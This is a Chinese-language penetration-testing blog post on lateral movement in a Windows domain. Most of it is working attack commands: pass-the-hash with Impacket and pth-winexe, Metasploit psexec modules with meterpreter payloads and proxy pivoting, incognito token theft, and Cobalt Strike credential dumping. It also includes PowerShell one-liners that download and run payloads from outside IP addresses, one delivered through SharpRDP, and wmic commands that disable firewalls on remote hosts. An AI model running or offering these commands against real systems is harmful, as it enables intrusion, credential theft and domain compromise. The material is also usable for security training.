<h3 id="Wmiexec-py"><a href="#Wmiexec-py" class="headerlink" title="Wmiexec.py"></a>Wmiexec.py</h3><p>Impacket套件<br>原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令<br>的结果和获取半交互式的shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wmiexec.py -share admin$ administrator:1qaz@WSX@10.10.10.201</span><br></pre></td></tr></table></figure>

<h2 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h2><p>Kali自带pth工具集</p>
<ul>
<li>工作组</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe -U administrator%1qaz@WSX3e --system --ostype=1 //10.10.10.201 command</span><br></pre></td></tr></table></figure>

<ul>
<li>域</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe  -U de1ay/administrator%Aatest --system --ostype=1 //192.168.3.90 command</span><br></pre></td></tr></table></figure>

<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>和前面的psexec工具类似，该工具集成到msf之中，注意哈，msf5中的下面某些模块在msf6中是没有用了的~~工具嘛，失效了就换下一个~ 何必单恋一支花-</p>
<p>这种psexec就是利用账号密码，登录后再执行命令~~~</p>
<p><del><code>auxiliary/admin/smb/ms17_010_command</code>在msf6模块也是有用的</del>，出了点问题</p>
<ul>
<li>执行<strong>单个命令</strong>的PTH模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; options</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set command whoami</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBUser administrator</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBPass 1qaz@WSX3e</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; run</span><br></pre></td></tr></table></figure>

<ul>
<li>执行直接就<strong>获取到meterpreter</strong>的PTH模块(有用)</li>
</ul>
<p>对域内知晓密码的机器进行攻击~~此刻的目标是DC</p>
<p>需要注意的是：</p>
<p>我们此时攻击的目标是内网机器，我们无法直接访问到，需要搭建代理，并且建立正向连接访问代理，再对内网的DC机器进行攻击！这一点是很重要的~~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">另外不要忘记添加代理，添加完代理后，msf会自动帮我们转发相应的请求</span><br><span class="line">#设置正向payload，建立正向连接</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt;set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">#添加路由</span><br><span class="line">run autoroute -s 10.10.10.0/24    添加到10.10.10.0网段的路由</span><br><span class="line">run autoroute -p    查看添加的路由</span><br><span class="line">#搭建socks代理</span><br><span class="line">search socks</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">exploit –j </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec_psh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; run</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081421408.png" alt="image-20220808142121175" style="zoom:50%;" />

<h3 id="Token窃取"><a href="#Token窃取" class="headerlink" title="Token窃取"></a>Token窃取</h3><ul>
<li>Token简介</li>
</ul>
<p>Windows有两种类型的Token：</p>
<ul>
<li><blockquote>
<p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p>
</blockquote>
</li>
<li><blockquote>
<p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p>
</blockquote>
</li>
</ul>
<p>两种token只在系统重启后清除</p>
<blockquote>
<p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p>
</blockquote>
<p>这也就意味着 当主机上某台主机登录过，那么可能会遗留下相应的token，我们窃取之就可以以其身份登录~~~</p>
<p>可以通过此方法提权至域管用户，当然得要域管遗留下来这个token</p>
<ul>
<li>Metasploit</li>
</ul>
<blockquote>
<p>在Metasploit中，可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载incognito模块：</span><br><span class="line">load incognito</span><br><span class="line">列举token：</span><br><span class="line">list_tokens -u</span><br><span class="line">查看当前token：</span><br><span class="line">getuid</span><br><span class="line">提示至system权限：</span><br><span class="line">getsystem</span><br><span class="line">token窃取：</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line">从进程窃取token：</span><br><span class="line">steal_token 4500</span><br><span class="line">返回之前token：</span><br><span class="line">rev2self、drop_token</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081427321.png" alt="image-20220808142725127" style="zoom:50%;" />

<h2 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h2><p>首先通过powershell脚本上线：(记得关闭杀软)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://124.223.217.243:1232/a1&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208202251708.png" alt="image-20220820225108246" style="zoom:50%;" />

<h3 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h3><p>beacon执行内置mimikatz的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>

<h3 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h3><p>PortScan扫描存活主机，随便选几个端口，先探测存活再去扫描端口，可以探测存活主机 。beacon会不断返回探测结果</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024828.png" alt="image-20220821002431586" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024245.png" alt="image-20220821002459084" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210028081.png" alt="image-20220821002824888" style="zoom:50%;" /></p>
<p>点击这个靶状的图标显示具体信息</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210029381.png" alt="image-20220821002907220" style="zoom:50%;" />

<h3 id="Psexec-1"><a href="#Psexec-1" class="headerlink" title="Psexec"></a>Psexec</h3><p>使用psexec就可以使用我们之前获取下来的账户密码 尝试登录这些机器了！！我们尝试移动到DC。在内网需要建立SMB监听（内网一台主机监听DC，我们的消息从smb传到WEB再传到我们VPS</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210045294.png" alt="image-20220821004545125" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210039528.png" alt="image-20220821003902374" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210041658.png" alt="image-20220821004108900" style="zoom:50%;" /></p>
<p>其中session选项就是，通过我们在内网拿下的主机，凭借此建立的session进行跳转~~</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210042915.png" alt="image-20220821004223743"></p>
<p>成功拿到DC,以WEB机器为跳板机，跳至DC</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210043074.png" alt="image-20220821004340903" style="zoom:50%;" />

<p>注意到SMB使用的payload是正向的管道连接~~</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210049564.png" alt="image-20220821004910411" style="zoom:50%;" />

<h3 id="Psexec-psh"><a href="#Psexec-psh" class="headerlink" title="Psexec_psh"></a>Psexec_psh</h3><blockquote>
<p>Psexec_psh hash传递</p>
</blockquote>
<h3 id="WinRM-1"><a href="#WinRM-1" class="headerlink" title="WinRM"></a>WinRM</h3><h3 id="Token窃取-1"><a href="#Token窃取-1" class="headerlink" title="Token窃取"></a>Token窃取</h3><p>steal token：只要用户登陆过就有对应token残留，我们就可以窃取~（只要没有关机）</p>
<p>另外：Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效（上面有讲）</p>
<p>可以对比下面的登录状态和注销状态的情况。并要注意到，msf自动集成了token窃取的工具，但是cs没有，需要我们手动上传。可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p>
<blockquote>
<p>de1ay\administrator登录状态</p>
</blockquote>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081430453.png" alt="image-20220808143054224" style="zoom:50%;" />

<blockquote>
<p>de1ay\administrator注销状态</p>
</blockquote>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081431488.png" alt="image-20220808143124291" style="zoom:50%;" />

<h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><blockquote>
<p>一个.NET控制台应用程序工具，可用于对横向目标执行针对远程目标<strong>的经过身份验证</strong>的命令执行。<br>用于经过身份验证的命令执行的远程桌面协议控制台应用程序</p>
</blockquote>
<h3 id="原理详解"><a href="#原理详解" class="headerlink" title="原理详解"></a>原理详解</h3><blockquote>
<p>再谈远程桌面横向移动<br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpRDP">0xthirteen&#x2F;SharpRDP</a></p>
</blockquote>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Regular RDP connection and execution</span><br><span class="line">常规RDP连接和执行</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password</span><br><span class="line"></span><br><span class="line">Exec program as child process of cmd or powershell</span><br><span class="line">执行程序作为cmd或powershell的子进程</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password exec=cmd</span><br><span class="line">Use restricted admin mode</span><br><span class="line">使用受限管理模式</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot;</span><br><span class="line">Connect first host drives</span><br><span class="line">连接第一个主机驱动器</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;\\tsclient\C\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password connectdrive=true</span><br><span class="line">Execute command elevated through Run Dialog - CURRENTLY BUGGED</span><br><span class="line">执行通过运行对话框提升的命令-当前已安装</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password elevated=winr</span><br><span class="line">Execute command elevated through task manager</span><br><span class="line">执行通过任务管理器提升的命令</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password elevated=taskmgr</span><br><span class="line">Add Network Level Authentication</span><br><span class="line">添加网络级身份验证</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password nla=true</span><br><span class="line">  </span><br><span class="line">Ask to take over logon session</span><br><span class="line">要求接管登录会话</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password takeover=true</span><br></pre></td></tr></table></figure>

<p>注：command为在目标机器上执行的命令<br>如果在目标上启用了受限管理模式，则不要指定任何凭据，它将使用当前用户上下文。<br>可以在 beacon 上 PTH 和 make_token ， windows 系统上 runas &#x2F;netonly</p>
<h3 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpRDP.exe computername=172.26.2.43 command=&quot;powershell.exe -nop -w hidden -c </span><br><span class="line">\&quot;IEX ((new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;http://139.155.49.43:880/a&#x27;))\&quot;&quot; </span><br><span class="line">username=MINGY\WIN7-1 password=iam8@Mingyue123</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050073.png" alt="image-20220808204827813"></p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050987.png" alt="image-20220808204839761"></p>
<h2 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h2><p>impacket套件是通过445端口进行通信的，不是135端口。</p>
<ul>
<li>Windows</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域用户</span><br><span class="line">wmiexec.exe -hashes :518B98AD4178A53695DC997AA02D455C 域</span><br><span class="line">名/administrator@192.168.3.123 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>Linux</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c </span><br><span class="line">administrator@10.10.10.201 &quot;ipconfig&quot;</span><br><span class="line">域用户：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c 域</span><br><span class="line">名/administrator@10.10.10.201 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>

<h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><ul>
<li>内网防火墙问题~内网可能主机开启了防火墙~~~该怎么办呢？（某些情况下，防火墙会阻止内网主机出网，会影响我们横向移动的时候，对内网其他主机发起请求作正向连接</li>
</ul>
<p>使用netsh对防火墙状态进行更改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看防火墙配置的策略</span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">#所有网络</span><br><span class="line">打开所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line">关闭所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">#为当前网络配置防火墙</span><br><span class="line">(与域/专用/公用网络无关)</span><br><span class="line">打开当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state on</span><br><span class="line">关闭当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state off</span><br><span class="line"></span><br><span class="line">#域网络</span><br><span class="line">打开域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state on</span><br><span class="line">关闭域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state off</span><br><span class="line"></span><br><span class="line">#专用网络</span><br><span class="line">打开专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state on</span><br><span class="line">关闭专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state off</span><br><span class="line"></span><br><span class="line">#公用网络</span><br><span class="line">打开公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state on</span><br><span class="line">关闭公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state off</span><br><span class="line"></span><br><span class="line">#较旧的Windows.版本</span><br><span class="line">XP Server 2003</span><br><span class="line">启用防火墙</span><br><span class="line">netsh firewall set opmode mode=ENABLE</span><br><span class="line">禁用防火墙</span><br><span class="line">netsh firewall set opmode mode=DISABLE</span><br></pre></td></tr></table></figure>

<ul>
<li>也是防火墙问题：msf正向连接报错，无法上线session会话时，我们如何关闭对面的防火墙呢</li>
</ul>
<p>前提时我们已经获取了该主机的账户密码，可以通过wmic连接上，并执行命令</p>
<p>关闭完对面的防火墙，就可以msf上线~~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#wmic关闭防火墙</span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process dall create &quot;cmd /c netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set domainprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set privateprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set publicprofile state off&quot;</span><br></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p>基于IPC的横向移动 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1691880">https://cloud.tencent.com/developer/article/1691880</a><br><a target="_blank" rel="noopener" href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">域渗透学习（五）基于IPC的远程连接</a><br>Impacket套件之远程命令执行功能讲解 <a target="_blank" rel="noopener" href="https://www.sohu.com/a/346196275_257305">https://www.sohu.com/a/346196275_257305</a><br>内网横向移动学习备忘录 - 清风明月&#96;s Blog <a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/140140.html">https://www.secpulse.com/archives/140140.html</a><br>SharpRDP - 远程桌面协议控制台应用程序，用于经过身份验证的命令执行 <a target="_blank" rel="noopener" href="https://www.mianshigee.com/project/0xthirteen-SharpRDP">https://www.mianshigee.com/project/0xthirteen-SharpRDP</a><br>WMI横向移动<a target="_blank" rel="noopener" href="https://blog.csdn.net/lhh134/article/details/104150949">https://blog.csdn.net/lhh134/article/details/104150949</a></p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">晚上十一点睡觉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html">http://example.com/渗透测试/内网/横向移动/0x28-内网横向移动.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">晚上十一点睡觉</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></div><div class="post_share"><div class="social-share" data-image="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237529.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html"><img class="prev-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308743.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">0x29 - 域内横向移动</div></div></a></div><div class="next-post pull-right"><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x30-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html"><img class="next-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237550.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">0x30 - Windows权限维持</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html" title="0x29 - 域内横向移动"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308743.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-21</div><div class="title">0x29 - 域内横向移动</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晚上十一点睡觉</div><div class="author-info__description">晚上十一点のBlog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">38</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/11pmsleep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/11pmsleep" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:860637048@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=860637048" target="_blank" title="qq"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">笔记迁移整理中~~~以前习惯有道云记笔记，整理知识也算沉淀自己的一部分吧·· 加油··stay passionate and never say die!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">横向移动简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E6%9D%83%E9%99%90"><span class="toc-number">2.</span> <span class="toc-text">获得权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">补充知识：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%AF%87"><span class="toc-number">3.</span> <span class="toc-text">横向移动-内置工具篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IPC"><span class="toc-number">3.1.</span> <span class="toc-text">IPC$</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text">IPC$  简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.2.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.3.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E5%8F%B7"><span class="toc-number">3.1.4.</span> <span class="toc-text">IPC$连接失败常见错误号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IPC-AT-x2F-Schtasks"><span class="toc-number">3.2.</span> <span class="toc-text">IPC+AT&#x2F;Schtasks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AT%E7%AE%80%E4%BB%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">AT简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Schtasks%E7%AE%80%E4%BB%8B"><span class="toc-number">3.2.2.</span> <span class="toc-text">Schtasks简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">命令格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">横向移动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IPC-SC"><span class="toc-number">3.3.</span> <span class="toc-text">IPC+SC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SC%E7%AE%80%E4%BB%8B"><span class="toc-number">3.3.1.</span> <span class="toc-text">SC简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SC%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%86%8C%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.2.</span> <span class="toc-text">SC远程注册服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMIC"><span class="toc-number">3.4.</span> <span class="toc-text">WMIC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC%E7%AE%80%E4%BB%8B"><span class="toc-number">3.4.1.</span> <span class="toc-text">WMIC简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.4.1.1.</span> <span 